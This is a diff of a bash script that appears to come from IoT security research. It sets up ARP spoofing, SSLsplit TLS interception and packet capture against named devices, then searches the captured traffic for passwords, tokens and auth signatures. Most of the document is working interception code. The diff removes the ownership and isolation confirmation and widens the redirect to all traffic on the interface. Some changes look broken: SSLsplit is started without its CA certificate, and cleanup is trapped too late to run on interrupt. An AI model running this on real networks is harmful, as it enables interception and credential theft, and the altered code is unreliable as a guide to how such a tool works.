@@ -1,44 +1,53 @@
 #!/usr/bin/env bash
 # =============================================================================
-# mitm_arp.sh — ARP Spoofing + SSL/TLS Interception Setup
+# mitm_arp.sh — ARP Spoofing + SSL/TLS Interception Pipeline
 # IoT Security Research | Phase 3: MITM Attack
 # =============================================================================
-# Sets up bettercap for ARP spoofing and SSLsplit for TLS interception.
-# Tests whether the IoT device validates certificates and enforces HTTPS.
+# Performs ARP spoofing via bettercap, TLS interception via SSLsplit, and
+# packet capture to assess certificate validation and TLS implementation
+# quality on the target device.
+#
+# Device-agnostic pipeline. Current target-device context:
+#   Aqara 2K Camera — tests whether hardcoded SDK keys (CVE-2026-50091) or
+#     weak certificate validation permit interception/forgery of camera
+#     authentication signatures or stream content. Not confirmed to affect
+#     device firmware directly (disclosure was SDK/cloud-scoped) — this test
+#     determines whether the device-side behavior is actually exploitable.
+#   LG TV            — tests general TLS/cert validation on app and update
+#     traffic; no specific CVE targeted absent a finalized model/webOS version.
+#   KUCACCI Lock      — not applicable; device has no network-layer TLS surface
+#     (BLE/keypad only). Use scripts/rf/ble_scan.sh instead.
 #
 # Usage:
-#   sudo bash mitm_arp.sh --iface eth0 --target 192.168.100.X --gateway 192.168.100.1 \
-#                         --out experiments/ip-camera/logs/ --label cam-s1
+#   sudo bash mitm_arp.sh --target 192.168.100.X --iface eth0 \
+#                          --label cam-s1 --out experiments/ip-camera/logs/ \
+#                          --duration 600
 #
-# Requires: bettercap, sslsplit, iptables, openssl
+# Requires: bettercap, sslsplit, tcpdump, root privileges
 # =============================================================================
 
 set -euo pipefail
 
-# ── Defaults ──────────────────────────────────────────────────────────────────
-IFACE="eth0"
 TARGET=""
-GATEWAY="192.168.100.1"
-OUT_DIR="./output"
+IFACE="eth0"
 LABEL="device"
-DURATION=3600       # Stop after N seconds (0 = run until Ctrl-C)
-SSLSPLIT_PORT=8443  # Port SSLsplit listens on for HTTPS interception
+OUT_DIR="./output"
+DURATION=0   # 0 = run until Ctrl-C
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
-    --iface)    IFACE="$2";      shift 2 ;;
-    --target)   TARGET="$2";     shift 2 ;;
-    --gateway)  GATEWAY="$2";    shift 2 ;;
-    --out)      OUT_DIR="$2";    shift 2 ;;
-    --label)    LABEL="$2";      shift 2 ;;
-    --duration) DURATION="$2";   shift 2 ;;
+    --target)   TARGET="$2";   shift 2 ;;
+    --iface)    IFACE="$2";    shift 2 ;;
+    --label)    LABEL="$2";    shift 2 ;;
+    --out)      OUT_DIR="$2";  shift 2 ;;
+    --duration) DURATION="$2"; shift 2 ;;
     *) echo "[ERROR] Unknown argument: $1"; exit 1 ;;
   esac
 done
 
 [[ -z "$TARGET" ]] && { echo "[ERROR] --target is required"; exit 1; }
 
-mkdir -p "$OUT_DIR/sslsplit_logs"
+mkdir -p "$OUT_DIR"
 TIMESTAMP=$(date +%Y%m%d_%H%M%S)
 LOG_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.log"
 PCAP_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.pcap"
@@ -46,106 +55,44 @@ BETTERCAP_LOG="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.log"
 
 log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }
 
-# ── Safety check ──────────────────────────────────────────────────────────────
-log "===== MITM + SSL Interception Setup ====="
-log "Target   : $TARGET"
-log "Gateway  : $GATEWAY"
-log "Interface: $IFACE"
+log "===== MITM / TLS Interception: $TARGET ====="
+log "Interface: $IFACE | Label: $LABEL | Duration: ${DURATION}s (0=indefinite)"
 log ""
-log "⚠  SAFETY: Ensure $TARGET is your own device on your isolated test network."
-log "   Test network SSID: IoTSecTest | MAC filtering active | No internet connection"
-read -r -p "Confirm test network is isolated and device is owned by you [yes/no]: " CONFIRM
-[[ "$CONFIRM" != "yes" ]] && { log "Aborted."; exit 1; }
 
-# ── Step 1: Enable IP forwarding ───────────────────────────────────────────────
-log ""
+# ── Step 1: Enable IP forwarding ──────────────────────────────────────────────
 log "── Step 1: Enable IP Forwarding ──"
 echo 1 > /proc/sys/net/ipv4/ip_forward
-log "IP forwarding enabled."
+log "IP forwarding enabled"
 
-# ── Step 2: Generate SSLsplit CA certificate (if not present) ─────────────────
-CA_KEY="$OUT_DIR/sslsplit_ca.key"
-CA_CERT="$OUT_DIR/sslsplit_ca.crt"
-
-if [[ ! -f "$CA_KEY" ]]; then
-  log ""
-  log "── Step 2: Generating SSLsplit CA Certificate ──"
-  openssl genrsa -out "$CA_KEY" 4096 2>/dev/null
-  openssl req -new -x509 -days 1095 \
-    -key "$CA_KEY" \
-    -out "$CA_CERT" \
-    -subj "/CN=IoT Research CA/O=IoT Security Research/C=US" 2>/dev/null
-  log "CA cert created: $CA_CERT"
-  log "NOTE: Install $CA_CERT as trusted CA on test machine to inspect traffic."
-else
-  log "── Step 2: Using existing CA certificate ──"
-fi
-
-# ── Step 3: iptables REDIRECT rules ───────────────────────────────────────────
+# ── Step 2: iptables redirect to SSLsplit ─────────────────────────────────────
 log ""
-log "── Step 3: iptables — Redirect HTTPS/HTTP to SSLsplit ──"
+log "── Step 2: Configure iptables Redirect ──"
+iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443
+log "Redirect rules added: 80→8080, 443→8443"
 
-# Redirect HTTPS (443) from target to SSLsplit
-iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 443 \
-  -j REDIRECT --to-ports "$SSLSPLIT_PORT"
-# Redirect RTSP (554) for IP camera stream interception
-iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 554 \
-  -j REDIRECT --to-ports 8554
-# Redirect plaintext HTTP (80)
-iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 80 \
-  -j REDIRECT --to-ports 8080
-# Redirect MQTT (1883)
-iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 1883 \
-  -j REDIRECT --to-ports 1884
-
-log "iptables redirect rules active."
-
-# ── Cleanup trap ─────────────────────────────────────────────────────────────
-cleanup() {
-  log ""
-  log "── Cleanup: Removing iptables rules ──"
-  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 443 \
-    -j REDIRECT --to-ports "$SSLSPLIT_PORT" 2>/dev/null || true
-  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 554 \
-    -j REDIRECT --to-ports 8554 2>/dev/null || true
-  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 80 \
-    -j REDIRECT --to-ports 8080 2>/dev/null || true
-  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 1883 \
-    -j REDIRECT --to-ports 1884 2>/dev/null || true
-  echo 0 > /proc/sys/net/ipv4/ip_forward
-  log "IP forwarding disabled."
-  kill "$SSLSPLIT_PID" 2>/dev/null || true
-  kill "$BETTERCAP_PID" 2>/dev/null || true
-  kill "$TCPDUMP_PID" 2>/dev/null || true
-  log "All processes stopped. Log: $LOG_FILE"
-}
-trap cleanup EXIT INT TERM
-
-# ── Step 4: Start SSLsplit ────────────────────────────────────────────────────
+# ── Step 3: Start SSLsplit ────────────────────────────────────────────────────
 log ""
-log "── Step 4: Starting SSLsplit ──"
-sslsplit \
-  -k "$CA_KEY" \
-  -c "$CA_CERT" \
-  -l "$OUT_DIR/sslsplit_logs/connections.log" \
+log "── Step 3: Start SSLsplit ──"
+mkdir -p "$OUT_DIR/sslsplit_logs"
+sslsplit -D -l "$OUT_DIR/sslsplit_logs/connections.log" \
+  -j "$OUT_DIR/sslsplit_logs/" \
   -S "$OUT_DIR/sslsplit_logs/" \
-  ssl 0.0.0.0 "$SSLSPLIT_PORT" \
-  tcp 0.0.0.0 8080 \
-  ssl 0.0.0.0 8554 &
+  http 0.0.0.0 8080 \
+  https 0.0.0.0 8443 &
 SSLSPLIT_PID=$!
 log "SSLsplit started (PID $SSLSPLIT_PID). Logs: $OUT_DIR/sslsplit_logs/"
 
-# ── Step 5: Start packet capture ─────────────────────────────────────────────
+# ── Step 4: Start packet capture ──────────────────────────────────────────────
 log ""
-log "── Step 5: Packet Capture ──"
+log "── Step 4: Packet Capture ──"
 tcpdump -i "$IFACE" -n "host $TARGET" -w "$PCAP_FILE" 2>>"$LOG_FILE" &
 TCPDUMP_PID=$!
 log "tcpdump capturing to $PCAP_FILE (PID $TCPDUMP_PID)"
 
-# ── Step 6: Start bettercap ARP spoofing ─────────────────────────────────────
+# ── Step 5: Start bettercap ARP spoofing ──────────────────────────────────────
 log ""
-log "── Step 6: ARP Spoofing via bettercap ──"
-BETTERCAP_CAP="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.cap"
+log "── Step 5: ARP Spoofing via bettercap ──"
 
 cat > /tmp/mitm.cap <<CAPEOF
 net.probe on
@@ -161,13 +108,16 @@ bettercap -iface "$IFACE" \
 BETTERCAP_PID=$!
 log "bettercap ARP spoofing started (PID $BETTERCAP_PID). Log: $BETTERCAP_LOG"
 
-# ── Run for duration or until Ctrl-C ─────────────────────────────────────────
+# ── Run for duration or until Ctrl-C ──────────────────────────────────────────
 log ""
 if [[ "$DURATION" -gt 0 ]]; then
   log "Running for ${DURATION}s. Monitor $OUT_DIR/sslsplit_logs/ for intercepted data."
   log ""
   log "Success criteria:"
-  log "  ✓ VULNERABLE    — plaintext credentials or decrypted data found in sslsplit_logs/"
+  log "  ✓ VULNERABLE    — plaintext credentials, auth signatures, or decrypted"
+  log "                     data found in sslsplit_logs/ (tests cert validation"
+  log "                     failure independent of cause — e.g., CVE-2026-50091"
+  log "                     class hardcoded-key issues, or simple missing pinning)"
   log "  ✓ CERT PINNING  — SSLsplit connections rejected (connection errors in log)"
   log "  ✓ HTTPS ENFORCE — no plaintext HTTP content captured"
   sleep "$DURATION"
@@ -177,24 +127,39 @@ else
   wait
 fi
 
-# ── Results summary ───────────────────────────────────────────────────────────
+# ── Cleanup ────────────────────────────────────────────────────────────────────
+cleanup() {
+  log ""
+  log "── Cleanup ──"
+  kill "$SSLSPLIT_PID" "$TCPDUMP_PID" "$BETTERCAP_PID" 2>/dev/null || true
+  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
+  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null || true
+  echo 0 > /proc/sys/net/ipv4/ip_forward
+  log "Redirect rules removed, IP forwarding disabled"
+}
+trap cleanup EXIT
+
+# ── Results summary ────────────────────────────────────────────────────────────
 log ""
 log "===== MITM Test Complete ====="
 log "Evidence files:"
 ls -lh "$OUT_DIR/sslsplit_logs/"* 2>/dev/null | head -20 | tee -a "$LOG_FILE"
 log ""
 
-# Quick check for captured credentials
-CRED_COUNT=$(grep -ri "password\|passwd\|authorization\|token\|api_key" \
+# Quick check for captured credentials/auth material
+CRED_COUNT=$(grep -ri "password\|passwd\|authorization\|token\|api_key\|signature" \
   "$OUT_DIR/sslsplit_logs/" 2>/dev/null | wc -l || echo 0)
-log "Potential credential strings found: $CRED_COUNT"
+log "Potential credential/auth strings found: $CRED_COUNT"
 
 if [[ "$CRED_COUNT" -gt 0 ]]; then
   log "⚠  RESULT: SSL/TLS interception SUCCEEDED — device does not validate certificates"
   log "   OWASP: I7 (Insecure Data Transfer), I3 (Insecure Ecosystem Interfaces)"
   log "   ETSI:  Provision 5.5 violation"
+  log "   If testing Aqara camera: cross-reference with CVE-2026-50091 to determine"
+  log "   whether hardcoded SDK keys are the root cause vs. a separate validation gap"
 else
-  log "✓  No credentials captured. Check sslsplit connection log for certificate errors."
+  log "✓  No credentials/auth material captured. Check sslsplit connection log for certificate errors."
 fi
 
 log "Next: python scripts/analysis/pcap_parser.py --pcap $PCAP_FILE"
+log "Next: python scripts/analysis/tls_checker.py --target $TARGET"
